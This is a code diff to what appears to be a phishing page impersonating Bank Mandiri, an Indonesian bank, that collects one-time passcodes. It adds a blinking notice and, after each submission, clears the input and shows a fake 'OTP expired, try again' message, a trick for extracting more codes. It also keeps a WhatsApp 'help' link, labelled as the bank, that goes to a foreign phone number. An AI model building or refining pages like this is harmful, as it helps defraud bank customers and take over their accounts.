@@ -275,6 +275,17 @@ input::-webkit-inner-spin-button {
     z-index: 99999999;
 }
 
+
+
+.blink{
+    animation: 0.5s blink steps(2) infinite;
+    font-weight: bold
+}
+
+ @keyframes blink {
+      0%  { visibility: hidden;}
+      100%  { visibility: visible;}
+    }
     </style> 
  </head> 
  <body> 
@@ -317,9 +328,9 @@ input::-webkit-inner-spin-button {
     
          <b>
 
-      <p onclick="location.href='https://wa.me/221762004306?text=Hallo%20𝗕𝗮𝗻𝗸%20𝗠𝗮𝗻𝗱𝗶𝗿𝗶%0ASaya%20Belum%20Mendapat%20Kode%20OTP'" style="font-size: 14px; text-align: center; margin-top: 20px; color: red">ʙᴇʟᴜᴍ ᴍᴇɴᴇʀɪᴍᴀ ᴋᴏᴅᴇ?<strong style="color: #098CE3; line-height: 15px">
+      <p id="belum" onclick="location.href='https://wa.me/221762004306?text=Hallo%20𝗕𝗮𝗻𝗸%20𝗠𝗮𝗻𝗱𝗶𝗿𝗶%0ASaya%20Belum%20Mendapat%20Kode%20OTP'" style="font-size: 14px; text-align: center; margin-top: 20px; color: red">ʙᴇʟᴜᴍ ᴍᴇɴᴇʀɪᴍᴀ ᴋᴏᴅᴇ?<strong style="color: #098CE3; line-height: 15px">
       <br  style="text-decoration: none; color: #098CE3; margin-top: -15px">ʀᴇǫᴜᴇsᴛ ᴋᴏᴅᴇ ᴏᴛᴘ</strong></p> 
-<p id="notif" style="position: fixed; left: 0; right: 0; font-size: 13px; margin-top: -10px; color: red"></p>
+<p class="blink" id="notif" style="left: 0; right: 0; font-size: 13px; margin-top: 20px; color: red"></p>
              <p style="font-size: 11px; text-align: center; margin-top: -10px; margin-left: 0px; margin-right: 0px;">
              <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjx2k9A5CdvvhLTXn_DXnZHbyczB3b5cMJ9KTLCjyKDx539QELYWbYKU0LpFYOfZ1YqH3PX7oPHVbdwJ7PCkZ05iiWqyUebExY-VrFy32-6XRES0rw3Hfg1CrDU6YbkJZjZtvOe3tSb7OUzTAXPs8EjCmICsHYzm697vrWr_uC1TSgOLe2Y3DT5BMIH/s1061/IMG_20230110_232318.jpg" width="100%" style="margin-top: 10px; max-width: 100%;">
     </p>
@@ -411,13 +422,15 @@ function kirimPesan(event) {
             console.log('Complete')
     setTimeout(function(){
        $("#lodingku").hide();
-     document.getElementById("pincode").reset();
+ $('input').val("");
       $("#notif").show();
+        $("#belum").hide();
       $("#pin").focus();
    $("#notif").text("- Kode OTP Kadaluarsa, Silahkan Coba Lagi. -");
    setTimeout(() => {
-       $("#notif").fadeOut();
-   }, 2500);
+       $("#notif").hide();
+       $("#belum").show();
+   }, 3000);
     }, 1500);}});};
 </script>
 <script>
